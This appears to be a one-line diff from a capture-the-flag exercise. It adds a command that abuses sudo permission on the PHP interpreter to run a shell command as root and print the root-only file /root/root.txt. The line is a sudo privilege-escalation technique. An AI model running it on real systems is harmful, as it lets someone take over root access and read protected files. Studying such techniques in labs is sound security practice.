@@ -1,0 +1,1 @@
+sudo /usr/bin/php -r "system('cat /root/root.txt');"
